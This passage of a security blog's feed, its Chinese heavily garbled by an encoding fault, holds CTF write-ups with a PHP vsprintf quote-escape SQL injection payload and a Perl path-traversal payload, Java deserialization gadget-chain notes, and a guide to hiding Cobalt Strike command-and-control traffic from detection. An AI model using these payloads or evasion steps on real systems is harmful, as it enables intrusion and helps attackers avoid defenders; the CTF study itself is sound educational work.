<p>å®˜æ–¹æ–‡æ¡£è¯´æ˜è¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼Œå…¶ä¸­%å’Œspecifieræ˜¯å¿…é¡»çš„ ä¹Ÿå°±æ˜¯è¯´%sæ˜¯æç®€æ¨¡å¼ã€‚æˆ‘ä»¬ä½¿ç”¨%1$â€™&lt; æ—¶ æœ‰æ²¡æœ‰å‘ç°è¿™ä¸ªæ ¼å¼çš„specifieråº”è¯¥æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>æ²¡æœ‰ï¼Œå¯¹æ²¡æœ‰specifierï¼Œæ‰€ä»¥%1$â€™&gt;%2$s å°±æŠŠ% å½“ä½œspecifieräº† è¿™ä¸ª%ä¹Ÿå°±é€ƒé€¸å‡ºæ¥äº†ï¼š</p>
<p>![image-20230908094433300](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230908094433300.png)</p>
<p>å…¶å®è¾“å‡º%éœ€è¦%%çš„è½¬ä¹‰å’Œè¿™ä¸ªåŸç†å‡ ä¹ä¸€æ‘¸ä¸€æ ·ã€‚</p>
<p>åç»­usernameéœ€è¦ä¼ å…¥htmlspecialchars($username):</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="operator">%</span><span class="number">1</span>$c<span class="operator">||</span><span class="number">1</span>#<span class="operator">%</span><span class="number">1</span>$<span class="string">&#x27;&amp;gt;%2$s</span></span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶æ‹¼æ¥å®Œçš„å‚æ•°æ˜¯ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$greeting</span> = Hello admin%<span class="number">1</span><span class="variable">$c</span>||<span class="number">1</span><span class="comment">#%1$&#x27;&amp;gt;%2$s, the server time is %s</span></span><br><span class="line"><span class="variable">$message</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$greeting</span>, [<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)]);</span><br><span class="line"><span class="number">1</span>ã€%<span class="number">1</span><span class="variable">$c</span> è¢«ä¸€ä¸ªå­—ç¬¦å¡«å……</span><br><span class="line"><span class="number">2</span>ã€%<span class="number">1</span>$<span class="string">&#x27;&amp;g è¢« 2023 å¡«å……ï¼Œå› ä¸º&amp;åé¢æ²¡æœ‰æ•°å­—ï¼Œæ‰€ä»¥æ²¡æœ‰ä½¿ç”¨&amp;å¡«å……ï¼Œåé¢specifieræ ‡å¿—ä¸ºä¸ºgè¡¨ç¤ºé€šç”¨æ ¼å¼ã€‚å¯ä»¥çœ‹å®˜æ–¹æ‰‹å†Œäº†è§£è¯¦æƒ…</span></span><br><span class="line"><span class="string">3ã€%2$s è¢«çœŸæ­£çš„flagå¡«å…… æœ€åçš„%sç¬¬ä¸€ä¸ªæ—¶é—´å­—ç¬¦ä¸²å¡«å……</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆæˆ‘ä»¬æ‹¿åˆ°flag</p>
<p>![image-20230908094908451](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230908094908451.png)</p>
<h3 id="æ‰©å±•"><a href="#æ‰©å±•" class="headerlink" title="æ‰©å±•"></a>æ‰©å±•</h3><p>ä¸Šé¢çš„$â€™ å¡«å……ä½¿ç”¨æ–¹å¼è¿˜å¯ä»¥åœ¨ä¸€äº›è½¬ä¹‰é€ƒé€¸ä¸­ä½¿ç”¨ï¼Œæ¯”å¦‚åœ¨sqlè¯­å¥ä¸­ç»å¸¸æœ‰éœ€è¦é—­åˆçš„â€™ è€Œä»£ç è½¬ä¹‰äº†â€™ å¯¼è‡´æˆ‘ä»¬æ— æ³•é—­åˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ ï¼š</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">%<span class="number">1</span><span class="variable">$&#x27;</span>or(<span class="number">1</span>=<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>ç»è¿‡è½¬ä¹‰å˜ä¸º</p>
<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"><span class="tag">%<span class="selector-tag">1</span></span>$\&#x27;or(1=1)#</span><br></pre></td></tr></table></figure>

<p>è€Œç»è¿‡vsprintfæ—¶ï¼Œå•å¼•å·å°±é€ƒé€¸å‡ºæ¥äº†</p>
<p>![image-20230908115035624](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230908115035624.png)</p>
<h4 id="cgi-friday"><a href="#cgi-friday" class="headerlink" title="cgi-friday"></a>cgi-friday</h4><p>ç›´æ¥çœ‹é¢˜ç›®</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env perl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> warnings;</span><br><span class="line"><span class="keyword">use</span> CGI::Minimal;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> constant <span class="string">HTDOCS =&gt;</span> <span class="string">&#x27;/usr/local/apache2/htdocs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">read_file</span> </span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($file_path) = @_;</span><br><span class="line">	<span class="keyword">my</span> $fh;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">local</span> $/;</span><br><span class="line">	<span class="keyword">open</span>($fh, <span class="string">&quot;&lt;&quot;</span>, $file_path) <span class="keyword">or</span> <span class="keyword">return</span> <span class="string">&quot;read_file error: $!&quot;</span>;</span><br><span class="line">	<span class="keyword">my</span> $content = &lt;$fh&gt;;</span><br><span class="line">	<span class="keyword">close</span>($fh);</span><br><span class="line">	<span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">route_request</span> </span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($page, $remote_addr) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^about$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/about.txt&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^version$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;/proc/version&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^cpuinfo$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/denied.txt&#x27;</span> <span class="keyword">unless</span> $remote_addr eq <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;/proc/cpuinfo&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^stat|io|maps$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/denied.txt&#x27;</span> <span class="keyword">unless</span> $remote_addr eq <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;/proc/self/$page&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/home.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">escape_html</span> </span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($text) = @_;</span><br><span class="line"></span><br><span class="line">	$text =~ <span class="regexp">s/&lt;/&amp;lt;/g</span>;</span><br><span class="line">	$text =~ <span class="regexp">s/&gt;/&amp;gt;/g</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $q = CGI::Minimal-&gt;new;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Content-Type: text/html\r\n\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $file_path = route_request($q-&gt;param(<span class="string">&#x27;page&#x27;</span>), $ENV&#123;<span class="string">&#x27;REMOTE_ADDR&#x27;</span>&#125;);</span><br><span class="line"><span class="keyword">my</span> $file_content = read_file($file_path);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> escape_html($file_content);</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆç†æ¸…æ¥šä»£ç é€»è¾‘ï¼š</p>
<p>1ã€$q-&gt;param(â€˜pageâ€™)æ¥å—ä¼ å…¥çš„pageå‚æ•°ã€$ENV{â€˜REMOTE_ADDRâ€™}æ‹¿åˆ°è¯·æ±‚çš„ip ä¸€èˆ¬è®¤ä¸ºè¿™ä¸ªæ˜¯ä¸å¯ä¼ªé€ çš„ã€‚</p>
<p>2ã€route_requestå¤„ç†ä¸Šè¿°è¯·æ±‚ï¼Œå½“æ»¡è¶³ä»¥ä¸‹ä¸¤ç‚¹å¯ä»¥æ‹¿åˆ°flag</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($page =~ <span class="regexp">/^stat|io|maps$/</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/denied.txt&#x27;</span> <span class="keyword">unless</span> $remote_addr eq <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;/proc/self/$page&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 1ã€pageå‚æ•°æ˜¯åŒ…å«io</span></span><br><span class="line"><span class="comment"># 2ã€$remote_addr ç­‰äº 127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸€ä¸ªå¥½ç»•è¿‡ï¼Œç¬¬äºŒä¸ªç›´æ¥æƒ³æ”¹å˜$ENV{â€˜REMOTE_ADDRâ€™}æ˜¯å›°éš¾çš„ï¼Œä½†æ˜¯$q-&gt;param(â€˜pageâ€™)å¯ä»¥æ¥æ”¶ä¸€ä¸ªlistè€Œä¸æ˜¯ä¸€ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸¤ä¸ªpageçš„æ•°ç»„ä¸€ä¸ªç”¨æ¥èµ‹å€¼$page,ä¸€ä¸ªç”¨æ¥èµ‹å€¼ç»™$remote_addr</p>
<p>æœ€ç»ˆpayload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?page=../../sys/module/vfio/../../../flag.txt&amp;page=127.0.0.1</span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°flagï¼šDUCTF{s qqjust another perl hacker q and print ucfirst}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2023javaååºåˆ—åŒ–éšä¾¿ä¹±è®°</title>
    <url>//posts/2023java-deserilize-view/</url>
    <content><![CDATA[<h1 id="JAVAååºåˆ—è¯ä¸²è®°"><a href="#JAVAååºåˆ—è¯ä¸²è®°" class="headerlink" title="JAVAååºåˆ—è¯ä¸²è®°"></a>JAVAååºåˆ—è¯ä¸²è®°</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>javaçš„ååºåˆ—åŒ–çœ‹ä¸€äº›ï¼Œ<em>ysoserial</em>å’Œfastjsonä»¥åŠshiroçš„ï¼Œä½†æ˜¯ç¬”è®°æ²¡æ€ä¹ˆåšã€‚è¿™ç¯‡æ–‡ç« ä¸»è¦åšç¬”è®°ç»™è‡ªå·±çœ‹ï¼ŒæŠŠjavaååºåˆ—åŒ–ä¸­çš„é“¾ä¸²ä¸€ä¸‹ï¼Œå¯èƒ½åªæœ‰æˆ‘è‡ªå·±èƒ½çœ‹æ‡‚å§ğŸ˜‚ã€‚å½“ç„¶å¦‚æœä½ å·²ç»è·Ÿå®Œæ‰€æœ‰çš„<em>ysoserial</em>ä»£ç ï¼Œè¿™ç¯‡æ–‡ç« ä¹Ÿå¯ä»¥å¸®ä½ æ¢³ç†ã€‚</p>
<span id="more"></span>

<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>URLDNSé“¾æ˜¯æœ€ç®€å•çš„ï¼Œè°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p>
<p>hashmap#readObject()â€“&gt;Hashmap#Hash()â€“&gt;URL#hashcodeâ€“&gt;URLStreamHandler#hashcode()â€“&gt;URLStreamHandler#getHostAddress</p>
<p>æ ¸å¿ƒå°±æ˜¯URLStreamHandler#hashcode()å¯ä»¥è°ƒç”¨ä¸€ä¸ªdnsæŸ¥è¯¢è¯·æ±‚ï¼ŒæŠŠURLStreamHandlerå¯¹è±¡è£…è½½åˆ°URLå¯¹è±¡ä¸­ï¼Œå†æŠŠURLå¯¹è±¡æ”¾å…¥hashmapçš„keyï¼Œå°±å¯ä»¥è§¦å‘ã€‚</p>
<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="transformer"><a href="#transformer" class="headerlink" title="transformer"></a>transformer</h3><p>Map#put()â€“&gt;decorate()â€“&gt;chaintransform#transform()â€“&gt;åç»­å°±æ˜¯ä¸€å †transformerçš„è°ƒç”¨åŒ…æ‹¬ï¼šinvoketransformerã€constant transformerã€</p>
<p>å¦‚æœè‡ªåŠ¨Map#put(), é€šè¿‡Annotation InvocationHandlerçš„readObjectæ»¡è¶³ã€‚</p>
<h3 id="lazymap"><a href="#lazymap" class="headerlink" title="lazymap"></a>lazymap</h3><p>CCé“¾ä¸­ä½¿ç”¨çš„CC1ï¼Œé€šè¿‡lazymap getå‡½æ•°è¿›è¡Œè°ƒç”¨transformã€‚å…¶ä»–å’Œä¸Šé¢ä¸€æ ·ã€‚</p>
<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>ä¸ºäº†é«˜ç‰ˆæœ¬çš„javaååºåˆ—åŒ–ç»•è¿‡ï¼Œ8u71ä»¥ä¸Šï¼ˆAnnotationInvocationHandleråŠ å…¥äº†linkHashmapï¼‰</p>
<p>Hashset#readObject()â€“&gt;Hashmap#putâ€“&gt;Hashmap#hash(key)â€“&gt;TideMapEntry#hashcodeâ€“&gt;this.getvalue()â€“&gt;å›åˆ°cc1çš„lazymap</p>
<p>ä¹Ÿå°±æ˜¯å¼•å…¥äº†Hashsetå’ŒTideMapEntry</p>
<p>é‡ç‚¹ï¼šoutermap.remove(â€œkeykeyâ€), å› ä¸ºåºåˆ—åŒ–è¿‡ç¨‹ä¸­å·²ç»hashcodeä¸€æ¬¡äº†ï¼Œå°±ä¸å†è¿›å…¥hashcodeäº†ï¼Œæ‰€ä»¥è¦ç§»é™¤ã€‚</p>
<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>ç»“åˆäº†TemplateImplåŠ è½½å­—èŠ‚ç æŠ€æœ¯ç»•è¿‡seckillerï¼ŒCC3ç»•è¿‡äº†Invokertransformerçš„é™åˆ¶ï¼Œå®ƒè°ƒç”¨TrAxFilterçš„æ„é€ æ–¹æ³•ï¼Œè°ƒç”¨templates#newtransformer() æ‰§è¡Œå­—èŠ‚ç ã€‚(InstiateTransformer)</p>
<h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>ç»“åˆCC3 ä½†æ˜¯è¿™é‡Œç”¨çš„æ˜¯common-collection4é‡Œé¢çš„ç±»ï¼Œå¼•å…¥äº†PriorityQueueï¼Œæœ€ç»ˆè°ƒç”¨ä¸€ä¸ªcomparatorçš„compareæ¥è°ƒç”¨chaintransformï¼ŒååŠéƒ¨åˆ†å’ŒCC3ç±»ä¼¼ã€‚ä¹Ÿæ˜¯åŠ è½½å­—èŠ‚ç ã€‚</p>
<h2 id="CB1"><a href="#CB1" class="headerlink" title="CB1"></a>CB1</h2><p>æŠŠCC4çš„PriorityQueueå˜æˆBeancomparator#compare()æ¥è§¦å‘Propertyutils#getProperty</p>
<p>PriorityQueue-&gt;compare()ä¼šè°ƒç”¨Propertyutils-&gt;getPropertyï¼Œæ­£å¥½èµ°åˆ°TemplatesImplçš„åŠ è½½å­—èŠ‚ç è°ƒç”¨é“¾ä¸­ã€‚</p>
<p>TemplatesImpl#getOutputProperties()-&gt;TemplatesImpl#newtransformers()</p>
<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><h2 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h2><p>æœåŠ¡ç«¯å®‰å…¨ç»„ åº”ç”¨å®‰å…¨ã€‚</p>
<p>åº”ç”¨å®‰å…¨ï¼Œç»„ä»¶ç›¸å…³çš„æ¼æ´ä¸Šçº¿å‰çš„ä¸œè¥¿ã€‚</p>
<p>å·¥å…· äººå·¥çš„ä»£ç å®¡è®¡ã€‚</p>
<p>ä¸“é¡¹æ²»ç†ã€‚</p>
<p>SDLã€‚</p>
<p>CTF æœ‰ä¸“é—¨è“å†›ã€‚</p>
<p>10ç‚¹-8ç‚¹ã€‚</p>
<p>éƒ¨é—¨ç¨³å®šæ€§æ€ä¹ˆæ ·ï¼ŸæŒºç¨³å®šçš„ã€‚</p>
<p>é»‘ç™½ç° SDLæµç¨‹ã€‚</p>
<p>æŠ€æœ¯ + ç ”å‘èƒ½åŠ› ã€‚</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Javaå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>//posts/undefined/</url>
    <content><![CDATA[<p>ç¬¬ä¸€éƒ¨åˆ†ï¼šèƒŒæ™¯ </p>
<p>è¡”æ¥ï¼šï¼ˆä¸€ç›´æ²¡æœ‰è½åœ°çš„ç»Ÿä¸€çš„å»ºè®¾æ ‡å‡†ï¼‰åŸºäºæ­¤</p>
<p>ç¬¬äºŒéƒ¨åˆ†ï¼šå¼•å…¥æ ‡å‡† è¯´æ˜æ ‡å‡† è¯´æ˜èŒƒå›´ åšä»€ä¹ˆç”¨ã€‚æ ‡å‡†å‡ºå…·æ—¶é—´ã€‚</p>
<p>ç¬¬ä¸‰éƒ¨åˆ†ï¼šæ ‡å‡†å†…çš„å¼•å…¥çš„å®‰å…¨æ€§çš„æ£€æµ‹ã€‚</p>
<p>ç¬¬å››éƒ¨åˆ†ï¼šå› ä¸ºç°åœ¨é¢ä¸´çš„å·¨å¤§çš„å®‰å…¨é£é™©ã€‚</p>
<p>ç¬¬äº”éƒ¨åˆ†ï¼šå„ç§é£é™©çš„ä»‹ç»</p>
<p>ç¬¬å…­éƒ¨åˆ†ï¼šé£Ÿå“è¿½æº¯ç³»ç»Ÿä½œä¸ºé£Ÿå“å®‰å…¨çš„é‡è¦ä¿éšœä¹‹ä¸€ï¼Œå®ƒæœ¬èº«çš„å®‰å…¨éœ€è¦é˜²æŠ¤ã€‚</p>
<p>â€‹                    ç½‘ç»œå®‰å…¨ä½œä¸ºæˆ˜ç•¥ä¿éšœä¹‹ä¸€ï¼Œé£Ÿå“è¿½æº¯ç³»ç»Ÿå®‰å…¨åº”ç´§è·Ÿå›½å®¶å·å¬ã€‚</p>
<p>ï¼ˆcfcaèƒ½åŠ›ï¼‰ç¬¬ä¸ƒéƒ¨åˆ†ï¼šç®¡ç†å®‰å…¨ä½“ç³»å»ºè®¾</p>
<p>ï¼ˆcfcaèƒ½åŠ›ï¼‰ç¬¬å…«éƒ¨åˆ†ï¼šæŠ€æœ¯å®‰å…¨ï¼ˆä¸ªäººä¿¡æ¯å®‰å…¨ã€ç½‘ç»œç³»ç»Ÿå®‰å…¨ï¼ˆç­‰ä¿ã€å¯†è¯„ï¼‰ã€æ•°æ®å®‰å…¨ï¼‰èƒ½åŠ›åˆ—å‡ºæ¥</p>
<p>ç»“å°¾ï¼š</p>
]]></content>
  </entry>
  <entry>
    <title>cobaltstrikeéšè—ç‰¹å¾</title>
    <url>//posts/cobaltstrike%E9%9A%90%E8%97%8F%E7%89%B9%E5%BE%81/</url>
    <content><![CDATA[<h1 id="cobaltstrikeéšè—ç‰¹å¾è®°å½•"><a href="#cobaltstrikeéšè—ç‰¹å¾è®°å½•" class="headerlink" title="cobaltstrikeéšè—ç‰¹å¾è®°å½•"></a>cobaltstrikeéšè—ç‰¹å¾è®°å½•</h1><h2 id="ç«¯å£ç‰¹å¾"><a href="#ç«¯å£ç‰¹å¾" class="headerlink" title="ç«¯å£ç‰¹å¾"></a>ç«¯å£ç‰¹å¾</h2><p>ç«¯å£å°½é‡ä¿®æ”¹éé»˜è®¤ç«¯å£ï¼Œé™¤äº†æ˜¯è§„é¿ç‰¹å¾ï¼Œä¹Ÿé˜²æ­¢è¢«æ‰«ã€‚è¿™ä¸ªä¿®æ”¹ç«¯å£éå¸¸ç®€å•ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</p>
<h2 id="è¯ä¹¦ç‰¹å¾"><a href="#è¯ä¹¦ç‰¹å¾" class="headerlink" title="è¯ä¹¦ç‰¹å¾"></a>è¯ä¹¦ç‰¹å¾</h2><p>è¿™é‡Œcobalstrikeæœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦ç”¨åˆ°è¯ä¹¦ï¼Œä¸€ä¸ªæ˜¯å’ŒCSçš„é€šä¿¡ï¼Œå¦ä¸€ä¸ªåˆ™æ˜¯æˆ‘ä»¬åˆ›å»ºhttpsç›‘å¬å™¨æ—¶ä¹Ÿéœ€è¦è¯ä¹¦ï¼Œè¿™ä¸¤ä¸ªéƒ½æœ‰é»˜è®¤è‡ªå¸¦ï¼Œä½†æ˜¯è‚¯å®šæ˜¯æœ‰ç‰¹å¾çš„ï¼Œæ‰€ä»¥éƒ½éœ€è¦è‡ªå·±ç”Ÿæˆã€‚ä¸€èˆ¬ç½‘ä¸Šæ•™ç¨‹ä¼šå¿½ç•¥å¯¹httpsè¯ä¹¦çš„ä¿®æ”¹ï¼Œå¯èƒ½ä¹Ÿä¼šè¢«æ€è½¯æ ‡è®°ã€‚</p>
<h4 id="ulike-store"><a href="#ulike-store" class="headerlink" title="ulike.store"></a>ulike.store</h4><p>æˆ‘ä»¬è¿™é‡Œç›´æ¥ä½¿ç”¨linuxè‡ªå¸¦çš„keytoolå‘½ä»¤ç”Ÿæˆè¯ä¹¦</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">keytool -keystore ulike.store -storepass xxxx123 -keypass xxxx123 -genkey -keyalg RSA -<span class="built_in">alias</span> ulike.com -dname <span class="string">&quot;CN=US, OU=ulike.com, O=Sofaware, L=Somewhere, ST=Cyberspace, C=CN&quot;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œé¢çš„å¯†ç æˆ‘ä»¬è¦è®°ä½ï¼Œåé¢å®šåˆ¶profileè¿˜éœ€è¦ä½¿ç”¨ã€‚</p>
<p>ä½ å¯ä»¥ç”Ÿæˆä¸¤ä¸ªä¸åŒçš„è¯ä¹¦ï¼Œä¹Ÿå¯ä»¥éƒ½é€‚ç”¨è¿™ä¸€ä¸ªè¯ä¹¦ã€‚å½“ç„¶ç½‘ä¸Šè¿˜æœ‰æ•™ç¨‹æ¨èç”Ÿæˆå¸¦ç»¿æ ‡çš„httpsè¯ä¹¦ï¼Œæˆ‘è§‰å¾—æ²¡æœ‰é‚£ä¸ªå¿…è¦ï¼Œèƒ½ç”¨å°±è¡Œï¼Œå¦‚æœä½ éœ€è¦ä¸€ä¸ªçœŸæ­£åˆè§„çš„httpsè¯ä¹¦ï¼Œé‚£ä½ éœ€è¦ç”³è¯·ä¸€ä¸ªåŸŸåï¼Œç„¶åå»cloudfareæˆ–è€…freesslç½‘ç«™ä¸Šå»ç”³è¯·ä¸€ä¸ªè¯ä¹¦ï¼Œä¹Ÿæ˜¯å…è´¹çš„ã€‚</p>
<h2 id="æµé‡å’Œè¡Œä¸ºç‰¹å¾"><a href="#æµé‡å’Œè¡Œä¸ºç‰¹å¾" class="headerlink" title="æµé‡å’Œè¡Œä¸ºç‰¹å¾"></a>æµé‡å’Œè¡Œä¸ºç‰¹å¾</h2><p>æµé‡ç‰¹å¾å¦‚æœä½ æœ‰æ·±åšçš„ç¼–ç¨‹åŠŸåº•ï¼Œå¯ä»¥ç›´æ¥å»äºŒå¼€CSï¼Œå¾ˆå¤šå®‰å…¨å¤§å‚ä¹Ÿæ˜¯è¿™æ ·åšçš„ã€‚å½“ç„¶æˆ‘æ²¡æœ‰ğŸ˜‚ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©å®šåˆ¶ä¸€ä¸‹profile, csçš„profileæ–‡ä»¶å¯ä»¥ä¿®æ”¹æµé‡ç‰¹å¾ä»¥åŠä¿®æ”¹beaconçš„é»˜è®¤è¡Œä¸ºï¼Œç›®çš„æ˜¯ä¸ºäº†è®©é€šä¿¡å˜å¾—æ›´åŠ éšè”½ã€‚</p>
<p>å¦‚æœä½ å¯¹profileçš„è¯­æ³•è¿˜ä¸å¤Ÿäº†è§£ï¼Œç”šè‡³ä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œæ¨èå»è¯»ä¸€ä¸‹å®˜æ–¹æ–‡æ¡£æˆ–è€…è¿™ä¸ªï¼š<a href="https://blog.zsec.uk/cobalt-strike-profiles/">https://blog.zsec.uk/cobalt-strike-profiles/</a></p>
<p>æˆ‘ä»¬è¿™é‡Œä¸ç›´æ¥æä¾›profile æ ·ä¾‹ï¼Œè€Œæ˜¯è¯´ä¸€ä¸‹åº”è¯¥æ³¨æ„ä»€ä¹ˆï¼š</p>
<ul>
<li><p>é¦–å…ˆæ˜¯è¦ä¿®æ”¹https http çš„å„ç§æµé‡ç‰¹å¾ï¼ŒåŠ ä¸€äº›è‡ªå·±çš„å®šåˆ¶å­—æ®µå’Œheaderä¼ªé€ ä¸ºæ­£å¸¸çš„æµé‡ã€‚</p>
</li>
<li><p>ä¿®æ”¹pipenameç®¡é“åç§°</p>
</li>
<li><p>ç»‘å®šhttpsè¯ä¹¦</p>
</li>
</ul>
<p>æˆ‘ä»¬ç»‘å®šä¸Šé¢çš„è¯ä¹¦åœ¨profileä¸­å¯ä»¥è¿™æ ·å†™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    <span class="built_in">set</span> keystore <span class="string">&quot;ulike.store&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> password <span class="string">&quot;xxxx123&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>è‡³äºå…¶ä»–çš„ä¸€äº›ç»†èŠ‚ï¼Œæ¯”å¦‚<strong>è¿›ç¨‹æ³¨å…¥ã€åå°„çš„beacon.dllæ–‡ä»¶çš„å…·ä½“ç‰¹å¾ç­‰</strong>ï¼Œå¯ä»¥å»githubä¸ŠæŸ¥æ‰¾çº¢é˜Ÿå¤§ä½¬çš„profileæ¡ˆä¾‹ï¼Œç†è§£åå­¦ä¹ ã€‚æ¯ä¸ªäººçš„å†™æ³•ä¸ä¸€è‡´ï¼Œè€Œä¸”è¢«ç ”ç©¶åä¹Ÿå®¹æ˜“è¢«é’ˆå¯¹ã€‚</p>
<h2 id="vpsç‰¹å¾"><a href="#vpsç‰¹å¾" class="headerlink" title="vpsç‰¹å¾"></a>vpsç‰¹å¾</h2><p>æœ‰æ—¶å€™æˆ‘ä»¬çš„æµé‡å…æ€å¯èƒ½éƒ½åšåˆ°ä½äº†ï¼Œä½†æ˜¯è¿˜æ˜¯è¢«æ€ï¼Œå¯ä»¥è€ƒè™‘ä¸‹æ˜¯ä¸æ˜¯vpsè¢«æ ‡è®°äº†ã€‚æ›´æ¢vpsã€‚æˆ–è€…åœ¨ä¸€å¼€å§‹ä½¿ç”¨çš„æ—¶å€™ï¼Œå°±å¯ä»¥ä½¿ç”¨cdnï¼ŒåŸŸå‰ç½®æŠ€æœ¯ï¼Œæ¥è§„é¿vpsçš„ipè¢«ç›´æ¥æ ‡è®°ã€‚</p>
]]></content>
      <categories>
        <category>çº¢è“å¯¹æŠ—</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>æˆ‘çš„gitç¬”è®°</title>
    <url>//posts/%E6%88%91%E7%9A%84git%E7%AC%94%E8%AE%B0/</url>
